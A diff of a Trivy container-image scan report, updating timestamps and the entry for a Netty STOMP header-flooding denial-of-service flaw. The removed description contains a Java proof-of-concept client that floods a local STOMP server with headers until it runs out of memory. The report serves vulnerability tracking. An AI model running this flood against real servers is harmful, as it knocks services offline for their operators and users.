@@ -3,8 +3,8 @@
   "Trivy": {
     "Version": "0.72.0"
   },
-  "ReportID": "019f6ef8-a2da-7986-9578-0af8c8a66be9",
-  "CreatedAt": "2026-07-17T07:26:56.218625349Z",
+  "ReportID": "019f74a9-b6f9-7393-bed3-45ec7134bdbb",
+  "CreatedAt": "2026-07-18T09:58:27.321235445Z",
   "ArtifactID": "sha256:613d663a46e94a8c1e70668307f2c1870de4832aee07d50d6f589f33a952042f",
   "ArtifactName": "ghcr.io/verity-org/cache:trinodb-trino-482",
   "ArtifactType": "container_image",
@@ -38864,8 +38864,12 @@
           },
           "Fingerprint": "sha256:35f4502eda5f9e5caad84aa22fe283b1be71a26b2de05bd2b4c8032c60cbb6dc",
           "Title": "Netty: Denial of Service via Unbounded Headers in StompSubframeDecoder",
-          "Description": "### Summary\nThe StompSubframeDecoder fails to limit the total number of headers or their cumulative size per frame, allowing an attacker to cause an OutOfMemoryError, leading to a Denial of Service.\n\n### Details\n`io.netty.handler.codec.stomp.StompSubframeDecoder` implements the STOMP protocol. The `maxLineLength` parameter restricts the length of individual header lines, but there is no mechanism to limit the total number of headers in a single STOMP frame. An attacker can send a large number of short headers (e.g., `a: 1\\n`), which are accumulated in memory inside the `DefaultStompHeadersSubframe` until the JVM throws an OutOfMemoryError.\n\n### PoC\nRun the server with `-Xmx256m`\n\n```java\npublic final class ServerApp {\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup group = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());\n        try {\n            ChannelFuture serverFuture = new ServerBootstrap()\n                    .group(group)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new StompSubframeDecoder())\n                    .bind(8080)\n                    .sync();\n            serverFuture.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```\n\n```java\npublic final class ClientApp {\n    public static void main(String[] args) throws Exception {\n        try (Socket socket = new Socket(\"127.0.0.1\", 8080)) {\n            OutputStream out = socket.getOutputStream();\n\n            out.write(\"CONNECT\\n\".getBytes(StandardCharsets.UTF_8));\n\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i \u003c 1000; i++) {\n                sb.append(\"a:1\\n\");\n            }\n            byte[] bulkHeaders = sb.toString().getBytes(StandardCharsets.UTF_8);\n\n            for (int i = 1; i \u003c= 50_000; i++) {\n                out.write(bulkHeaders);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n### Impact\nDenial of Service: An attacker can easily exhaust the server's memory by sending a single malicious STOMP message. Any server exposing a STOMP endpoint based on StompSubframeDecoder is vulnerable to DoS.",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. Prior to 4.1.136.Final and 4.2.16.Final, io.netty.handler.codec.stomp.StompSubframeDecoder fails to limit the total number of headers or their cumulative size per frame, and the maxLineLength parameter only restricts individual header lines. An attacker can send a large number of short headers that are accumulated in memory inside DefaultStompHeadersSubframe until the JVM throws an OutOfMemoryError, causing denial of service for servers exposing a STOMP endpoint based on StompSubframeDecoder. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
           "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-770"
+          ],
           "VendorSeverity": {
             "ghsa": 3
           },
@@ -38877,8 +38881,16 @@
           },
           "References": [
             "https://github.com/netty/netty",
+            "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
+            "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
+            "https://github.com/netty/netty/pull/17063",
+            "https://github.com/netty/netty/pull/17065",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
             "https://github.com/netty/netty/security/advisories/GHSA-vhch-2wf3-m8rp"
-          ]
+          ],
+          "PublishedDate": "2026-07-17T21:17:06.25Z",
+          "LastModifiedDate": "2026-07-17T21:17:06.25Z"
         },
         {
           "VulnerabilityID": "CVE-2026-46718",
